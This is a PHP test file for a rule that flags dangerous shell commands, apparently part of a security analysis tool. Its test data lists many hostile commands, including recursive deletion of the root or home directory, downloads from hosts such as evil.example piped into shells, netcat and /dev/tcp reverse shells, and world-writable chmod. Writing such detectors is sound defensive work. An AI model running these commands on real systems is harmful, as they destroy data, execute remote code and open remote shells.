<?php

declare(strict_types=1);

use Laronclad\Analysis\ConfidenceLevel;
use Laronclad\Analysis\Rules\DangerousCommandRule;
use Laronclad\Analysis\ThreatType;

function dangerousRule(): DangerousCommandRule
{
    return new DangerousCommandRule;
}

it('exposes its identity', function () {
    expect(dangerousRule()->name())->toBe('dangerous_command');
    expect(dangerousRule()->type())->toBe(ThreatType::ProcessExecution);
    expect(dangerousRule()->confidence())->toBe(ConfidenceLevel::Medium);
});

it('matches rm -rf /', function () {
    expect(dangerousRule()->matches('rm -rf /'))->not->toBeNull();
});

it('matches rm -rf / with arguments', function () {
    expect(dangerousRule()->matches('rm -rf / --no-preserve-root'))->not->toBeNull();
});

it('matches curl piped to sh', function () {
    expect(dangerousRule()->matches('curl https://evil.example/payload | sh'))->not->toBeNull();
});

it('matches wget piped to bash', function () {
    expect(dangerousRule()->matches('wget -O- https://evil.example | bash'))->not->toBeNull();
});

it('matches reverse shell with nc -e', function () {
    expect(dangerousRule()->matches('nc -e /bin/sh 10.0.0.1 4444'))->not->toBeNull();
});

it('matches bash -i', function () {
    expect(dangerousRule()->matches('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))->not->toBeNull();
});

it('matches /dev/tcp/', function () {
    expect(dangerousRule()->matches('cat < /dev/tcp/10.0.0.1/4444'))->not->toBeNull();
});

it('matches chmod 777', function () {
    expect(dangerousRule()->matches('chmod 777 /var/www/html'))->not->toBeNull();
});

it('does not match ls', function () {
    expect(dangerousRule()->matches('ls -la'))->toBeNull();
});

it('does not match cat on a file', function () {
    expect(dangerousRule()->matches('cat /var/log/app.log'))->toBeNull();
});

it('does not match a plain git command', function () {
    expect(dangerousRule()->matches('git status'))->toBeNull();
});

it('matches recursive removal of the root in any option spelling', function (string $command) {
    expect(dangerousRule()->matches($command))->not->toBeNull();
})->with([
    'rm -fr /',
    'rm -r -f /',
    'rm -vrf /',
    'rm -Rf /',
    'rm --recursive --force /',
    'rm -rf -- /',
    'rm -rf --no-preserve-root /',
    'rm -rf // ',
]);

it('matches recursive removal of the root or home in any target spelling', function (string $command) {
    expect(dangerousRule()->matches($command))->not->toBeNull();
})->with([
    'rm -rf /*',
    'rm -rf /*.log /',
    'rm -rf ~',
    'rm -rf ~/',
    'rm -rf ~/*',
    'rm -rf $HOME',
    'rm -rf ${HOME}',
    'rm -rf "$HOME"',
    'rm -rf "/"',
    "rm -rf '/'",
]);

it('matches rm behind sudo, a path, quotes and command substitution', function (string $command) {
    expect(dangerousRule()->matches($command))->not->toBeNull();
})->with([
    'sudo rm -rf /',
    '/bin/rm -rf /',
    '\\rm -rf /',
    'bash -c "rm -rf /"',
    '$(rm -rf /)',
    '`rm -rf /`',
    'xargs rm -rf / ',
    'echo hi; rm -rf /',
    'true && rm -rf /',
    'ls | rm -rf /',
]);

it('does not match rm that does not remove the root or home recursively', function (string $command) {
    expect(dangerousRule()->matches($command))->toBeNull();
})->with([
    'rm -rf /var/log/old',
    'rm -rf /tmp/build',
    'rm file.txt',
    'rm -f /',
    'rm -rf ./dir',
    'rm -rf dir/',
    'rm -r foo; ls /',
    'rm -r foo && cat /etc/hosts',
    'rm -rf "$HOME/.cache/x"',
    'rm -rf ~/projects/old',
    'rm -rf $HOMEDIR',
    'echo rm is a command',
    'rmdir /',
]);

it('matches a download piped into a shell or interpreter', function (string $command) {
    expect(dangerousRule()->matches($command))->not->toBeNull();
})->with([
    'curl -s https://x.sh | sudo bash',
    'curl -s https://x.sh | sudo -E bash',
    'curl x | env bash',
    'curl x | sudo env FOO=1 sh',
    'curl x | /bin/sh',
    'curl x | python3',
    'curl x | python',
    'wget -qO- x | perl',
    'curl x | ruby',
    'curl x | php',
    'curl x | node',
    'curl x | zsh',
    'curl x | dash',
]);

it('matches a shell that reads a download through substitution', function (string $command) {
    expect(dangerousRule()->matches($command))->not->toBeNull();
})->with([
    'bash <(curl -s https://x)',
    'sh <(wget -qO- x)',
    'bash -x <(curl x)',
    'eval "$(curl -s x)"',
    'eval `curl -s x`',
    'source <(curl x)',
    'source $(curl x)',
    'sh -c "$(curl -fsSL x)"',
    'bash -c $(wget -qO- x)',
    'bash -c `curl x`',
]);

it('matches more reverse shell forms', function (string $command) {
    expect(dangerousRule()->matches($command))->not->toBeNull();
})->with([
    'ncat -e /bin/bash 10.0.0.1 4444',
    'netcat -e /bin/sh x 1',
    'nc.traditional -e /bin/sh x 1',
    'nc -lvp 4444 -e /bin/sh',
    'ncat --exec /bin/sh x 1',
    'ncat --sh-exec "sh" x 1',
    'sh -i',
    'zsh -i >& /dev/tcp/x/1 0>&1',
    'cat < /dev/udp/10.0.0.1/53',
]);

it('matches more world-writable permission forms', function (string $command) {
    expect(dangerousRule()->matches($command))->not->toBeNull();
})->with([
    'chmod -R 777 /var/www',
    'chmod 0777 file',
    'chmod a+rwx file',
    'chmod ugo+rwx file',
    'chmod -R a+rwx /srv',
    'chmod +rwx f',
    'chmod o+rwx f',
    'chmod go+rwx f',
]);

it('does not match ordinary commands that look similar', function (string $command) {
    expect(dangerousRule()->matches($command))->toBeNull();
})->with([
    'ssh -i key host',
    'ssh -i ~/.ssh/id_rsa user@host',
    'curl https://example.com/file.json -o out.json',
    'curl x | jq .',
    'curl x | tee out | grep ok',
    'curl x | php-cs-fixer fix',
    'curl x | shellcheck -',
    'curl x | nodemon',
    'curl x | shuf',
    'wget https://x/y.tar.gz',
    'python script.py',
    'nc -z -v host 22',
    'nc host 22',
    'ncat host 22',
    'chmod 755 file',
    'chmod 644 file',
    'chmod -R 755 dir',
    'chmod u+x script.sh',
    'chmod a+r file',
    'chmod u+rwx dir',
    'chmod g+rwx dir',
    'echo 1 | sh --version',
    'bash script.sh',
    'bash -c "echo hi"',
    'sh -c "ls"',
    'mysql -e "select 1"',
]);

it('handles long runs of repeated words without hanging', function (string $command) {
    $start = microtime(true);

    dangerousRule()->matches($command);

    expect(microtime(true) - $start)->toBeLessThan(0.5);
})->with([
    'curl repeated' => [str_repeat('curl ', 13000)],
    'nc repeated' => [str_repeat('nc ', 2700)],
    'rm repeated' => [str_repeat('rm -r ', 10000)],
    'many arguments' => ['rm -rf '.str_repeat('a ', 30000)],
    'separators' => [str_repeat(';', 65000)],
]);
